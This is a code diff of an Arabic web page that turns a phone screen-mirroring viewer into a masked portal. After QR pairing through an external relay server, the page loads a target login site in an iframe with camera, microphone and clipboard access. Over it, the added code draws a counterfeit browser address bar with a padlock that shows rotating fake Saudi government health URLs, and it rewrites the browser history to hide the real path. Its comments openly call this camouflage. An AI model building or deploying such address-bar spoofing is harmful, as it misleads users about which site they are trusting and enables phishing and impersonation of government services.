@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>منظومة الخدمات - الشاشة التفاعلية</title>
+  <title>بوابة الخدمات الإلكترونية</title>
   
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
@@ -29,7 +29,6 @@
       overflow: hidden; 
       margin: 0; 
       padding: 0; 
-      user-select: none;
     }
 
     /* 1. شاشة مسح الـ QR */
@@ -143,136 +142,83 @@
       font-size: 0.9rem;
     }
 
-    /* 2. شاشة البث والتكبير التفاعلي */
-    #mirrorScreen {
+    /* 2. شاشة النظام الفعلية داخل نفس التبويب */
+    #systemContainer {
       display: none;
       width: 100vw;
       height: 100vh;
-      background: #0b0f19;
       position: fixed;
       top: 0;
       left: 0;
       z-index: 10;
-      align-items: center;
-      justify-content: center;
+      background: #fff;
     }
 
-    .mirror-viewport {
-      position: relative;
+    #systemFrame {
       width: 100vw;
       height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: auto;
-      background: #000;
+      border: none;
     }
 
-    #streamImg {
-      display: none;
-      cursor: crosshair;
-      transition: transform 0.15s ease-out;
-      transform-origin: center center;
-    }
-
-    .waiting-box {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
-      color: #94a3b8;
-      font-size: 1rem;
-    }
-
-    /* شريط أدوات تحكم تفاعلي مع التكبير */
-    .mirror-toolbar {
+    /* شريط العنوان الوهمي المموه الاحترافي */
+    .fake-header-bar {
       position: fixed;
-      top: 12px;
-      left: 12px;
-      z-index: 50;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 38px;
+      background: #1e293b;
+      color: #e2e8f0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      z-index: 20;
+      border-bottom: 1px solid #334155;
+      font-size: 0.85rem;
+      direction: ltr;
+    }
+
+    .fake-url-box {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #0f172a;
+      padding: 4px 14px;
+      border-radius: 6px;
+      border: 1px solid #334155;
+      color: #94a3b8;
+      width: 60%;
+      max-width: 600px;
+      font-family: monospace;
+      font-size: 0.82rem;
+    }
+
+    .fake-url-box i {
+      color: #10b981;
+    }
+
+    .fake-url-text {
+      color: #cbd5e1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .fake-actions {
       display: flex;
       gap: 8px;
-      background: rgba(15, 23, 42, 0.85);
-      padding: 6px;
-      border-radius: 10px;
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      backdrop-filter: blur(8px);
-      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
     }
 
-    .tool-btn {
-      background: rgba(255, 255, 255, 0.1);
+    .btn-exit {
+      background: #ef4444;
       color: #fff;
       border: none;
-      padding: 6px 12px;
+      padding: 4px 12px;
       border-radius: 6px;
-      font-size: 0.82rem;
+      font-size: 0.75rem;
       font-weight: 600;
       cursor: pointer;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      transition: all 0.2s;
-    }
-
-    .tool-btn:hover {
-      background: #2563eb;
-    }
-
-    .tool-btn-danger:hover {
-      background: #ef4444;
-    }
-
-    .live-indicator {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      background: rgba(16, 185, 129, 0.15);
-      border: 1px solid rgba(16, 185, 129, 0.3);
-      color: #34d399;
-      padding: 6px 12px;
-      border-radius: 6px;
-      font-size: 0.82rem;
-      font-weight: 700;
-    }
-
-    /* حقل إدخال نصوص ذكي للكتابة من لوحة المفاتيح */
-    .quick-input-bar {
-      position: fixed;
-      bottom: 16px;
-      left: 50%;
-      transform: translateX(-50%);
-      z-index: 50;
-      display: flex;
-      gap: 8px;
-      background: rgba(15, 23, 42, 0.9);
-      padding: 8px 12px;
-      border-radius: 12px;
-      border: 1px solid rgba(255,255,255,0.2);
-      backdrop-filter: blur(8px);
-      width: 90%;
-      max-width: 520px;
-    }
-
-    .quick-input-bar input {
-      flex: 1;
-      background: rgba(255,255,255,0.08);
-      border: 1px solid rgba(255,255,255,0.15);
-      color: #fff;
-      padding: 8px 12px;
-      border-radius: 8px;
-      outline: none;
-      font-size: 0.9rem;
-    }
-
-    .quick-input-bar button {
-      background: #2563eb;
-      color: #fff;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
     }
 
     @keyframes pulse {
@@ -289,18 +235,18 @@
 </head>
 <body>
 
-  <!-- شاشة مسح الـ QR -->
+  <!-- 1. شاشة مسح الـ QR -->
   <div id="authScreen">
     <div class="auth-card">
       <div class="app-icon">
-        <i class="fa-solid fa-mobile-screen-button"></i>
+        <i class="fa-solid fa-network-wired"></i>
       </div>
-      <h1 class="auth-title">مشاركة شاشة التطبيق</h1>
-      <p class="auth-subtitle">عرض تفاعلي مباشر لشاشة الجوال في المتصفح دون إظهار أي روابط خارجية</p>
+      <h1 class="auth-title">بوابة النظام الموحدة</h1>
+      <p class="auth-subtitle">اتصال آمن ومموه عبر المتصفح لحماية الخصوصية ومسارات النظام</p>
       
       <div class="status-badge">
         <span class="pulse-dot"></span>
-        <span id="socketStatusText">جاري الاتصال...</span>
+        <span id="socketStatusText">جاري تهيئة الرابط الآمن...</span>
       </div>
 
       <div class="qr-container">
@@ -310,46 +256,45 @@
       <div class="instructions">
         <li><i class="fa-solid fa-mobile-screen"></i> افتح تطبيق الهاتف وانتقل إلى "الإعدادات"</li>
         <li><i class="fa-solid fa-qrcode"></i> اختر "ربط المتصفح (Web QR)"</li>
-        <li><i class="fa-solid fa-camera"></i> وجّه الكاميرا نحو هذا الرمز للبدء بالمشاركة فوراً</li>
+        <li><i class="fa-solid fa-camera"></i> وجّه الكاميرا نحو هذا الرمز لفتح النظام فوراً</li>
       </div>
     </div>
   </div>
 
-  <!-- شاشة العرض التفاعلي الحي المباشر -->
-  <div id="mirrorScreen">
-    <div class="mirror-toolbar">
-      <div class="live-indicator">
-        <span class="pulse-dot" style="background:#10b981;"></span>
-        مباشر
+  <!-- 2. حاوية النظام مع شريط الرابط الوهمي المشفر -->
+  <div id="systemContainer">
+    <!-- شريط الرابط الوهمي لتغطية وتمويه المسار الحقيقي -->
+    <div class="fake-header-bar">
+      <div class="fake-url-box">
+        <i class="fa-solid fa-lock"></i>
+        <span class="fake-url-text" id="fakeUrlDisplay">https://secure.health-gov.sa/portal/app?token=...</span>
       </div>
-      <!-- أزرار التكبير والتصغير -->
-      <button class="tool-btn" onclick="zoomIn()"><i class="fa-solid fa-magnifying-glass-plus"></i> تكبير</button>
-      <button class="tool-btn" onclick="zoomOut()"><i class="fa-solid fa-magnifying-glass-minus"></i> تصغير</button>
-      <button class="tool-btn" onclick="resetZoom()"><i class="fa-solid fa-arrows-rotate"></i> 100%</button>
-      <button class="tool-btn" onclick="toggleFullScreen()"><i class="fa-solid fa-expand"></i> ملء الشاشة</button>
-      <button class="tool-btn tool-btn-danger" onclick="logoutSession()"><i class="fa-solid fa-power-off"></i> خروج</button>
+      <div class="fake-actions">
+        <button class="btn-exit" onclick="logoutSession()">إنهاء الجلسة</button>
+      </div>
     </div>
 
-    <div class="mirror-viewport" id="viewport">
-      <div class="waiting-box" id="waitingBox">
-        <i class="fa-solid fa-circle-notch fa-spin fa-2x"></i>
-        <span>جاري مزامنة وبث الشاشة الحية...</span>
-      </div>
-      <img id="streamImg" alt="شاشة الجوال المباشرة" />
-    </div>
-
-    <!-- شريط كتابة النصوص وإرسالها فوراً للحقل النشط في الجوال -->
-    <div class="quick-input-bar">
-      <input type="text" id="keyboardInput" placeholder="اكتب هنا واضغط إرسال (أو Enter) للكتابة في الجوال..." />
-      <button onclick="sendTypedText()"><i class="fa-solid fa-paper-plane"></i> إرسال</button>
-    </div>
+    <!-- نافذة الموقع الحقيقي تعمل بكامل وظائفها وأصالتها ومثبتة أسفل الشريط الوهمي -->
+    <iframe id="systemFrame" src="about:blank" style="margin-top: 38px; height: calc(100vh - 38px);" allow="geolocation; microphone; camera; clipboard-read; clipboard-write;"></iframe>
   </div>
 
   <script>
     const RELAY_SERVER_URL = "https://metrix-web-relay.onrender.com";
     let socket = null;
     let sessionId = 'web_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now();
-    let currentZoom = 1.0;
+
+    // قائمة الروابط الوهمية المبتكرة للتمويه
+    const FAKE_ROUTES = [
+      "https://portal.moh.gov.sa/dashboard/workstation?session=",
+      "https://secure-ehr.gov.sa/services/core-view?token=",
+      "https://health-internal.net/portal/services/view?auth="
+    ];
+
+    function getRandomFakeUrl() {
+      const base = FAKE_ROUTES[Math.floor(Math.random() * FAKE_ROUTES.length)];
+      const token = Math.random().toString(36).substring(2, 12) + '-' + Date.now().toString(36);
+      return base + token;
+    }
 
     function getBrowserInfo() {
       const ua = navigator.userAgent;
@@ -421,11 +366,11 @@
       });
 
       socket.on("authenticated", (data) => {
-        handleIncomingData(data);
+        launchMaskedSystem(data);
       });
 
       socket.on("session_authorized", (data) => {
-        handleIncomingData(data);
+        launchMaskedSystem(data);
       });
 
       socket.on("session_terminated", () => {
@@ -433,102 +378,32 @@
       });
     }
 
-    function handleIncomingData(data) {
-      showMirrorScreen();
-      if (data && data.frame) {
-        const img = document.getElementById("streamImg");
-        const waiting = document.getElementById("waitingBox");
-        img.src = data.frame;
-        img.style.display = "block";
-        waiting.style.display = "none";
-      }
-    }
-
-    function showMirrorScreen() {
+    function launchMaskedSystem(data) {
       document.getElementById("authScreen").style.display = "none";
-      const mirror = document.getElementById("mirrorScreen");
-      mirror.style.display = "flex";
-      document.title = "منظومة الخدمات - شاشة مباشرة";
-    }
+      const container = document.getElementById("systemContainer");
+      const frame = document.getElementById("systemFrame");
+      const fakeUrlEl = document.getElementById("fakeUrlDisplay");
 
-    // التحكم في التكبير والتصغير
-    const streamImg = document.getElementById("streamImg");
+      container.style.display = "block";
 
-    function applyZoom() {
-      streamImg.style.transform = `scale(${currentZoom})`;
-    }
+      // 1. توليد رابط وهمي رسمي مموه وعرضه
+      const fakeUrl = getRandomFakeUrl();
+      fakeUrlEl.innerText = fakeUrl;
 
-    function zoomIn() {
-      currentZoom = Math.min(2.5, currentZoom + 0.2);
-      applyZoom();
-    }
+      // 2. تغيير مسار المتصفح برمجياً في الـ History دون الانتقال لخارج الصفحة
+      try {
+        const fakeSlug = "?session=" + Math.random().toString(36).substring(2, 8);
+        window.history.pushState({ page: 1 }, "منظومة الخدمات", fakeSlug);
+      } catch(e) {}
 
-    function zoomOut() {
-      currentZoom = Math.max(0.6, currentZoom - 0.2);
-      applyZoom();
-    }
+      // 3. فتح النظام الفعلي مباشرة ليعمل بكامل الصلاحيات
+      const targetUrl = (data && data.targetUrl) ? data.targetUrl : "https://pmhsa.org/web_www1/login?return=true&";
+      frame.src = targetUrl;
 
-    function resetZoom() {
-      currentZoom = 1.0;
-      applyZoom();
-    }
-
-    // إرسال نقرات الماوس من الكمبيوتر للجوال
-    streamImg.addEventListener("click", (e) => {
-      if (!socket || !socket.connected) return;
-      const rect = streamImg.getBoundingClientRect();
-      const x = (e.clientX - rect.left) / rect.width;
-      const y = (e.clientY - rect.top) / rect.height;
-
-      socket.emit("relay_to_phone", {
-        sessionId: sessionId,
-        action: "mouse_click",
-        data: {
-          x: Math.max(0, Math.min(1, x)),
-          y: Math.max(0, Math.min(1, y))
-        }
-      });
-    });
-
-    // إرسال التمرير (Scroll) من الماوس للجوال
-    window.addEventListener("wheel", (e) => {
-      if (!socket || !socket.connected) return;
-      socket.emit("relay_to_phone", {
-        sessionId: sessionId,
-        action: "scroll_page",
-        data: {
-          deltaY: Math.round(e.deltaY)
-        }
-      });
-    });
-
-    // إرسال النص المكتوب إلى الحقل في الجوال
-    const inputEl = document.getElementById("keyboardInput");
-    inputEl.addEventListener("keypress", (e) => {
-      if (e.key === "Enter") {
-        sendTypedText();
-      }
-    });
-
-    function sendTypedText() {
-      const text = inputEl.value;
-      if (!text || !socket || !socket.connected) return;
-      
-      socket.emit("relay_to_phone", {
-        sessionId: sessionId,
-        action: "key_press",
-        data: { text: text }
-      });
-
-      inputEl.value = "";
-    }
-
-    function toggleFullScreen() {
-      if (!document.fullscreenElement) {
-        document.documentElement.requestFullscreen().catch(() => {});
-      } else if (document.exitFullscreen) {
-        document.exitFullscreen();
-      }
+      // تحديث الرابط الوهمي دورياً عند التصفح
+      setInterval(() => {
+        fakeUrlEl.innerText = getRandomFakeUrl();
+      }, 30000);
     }
 
     function logoutSession() {
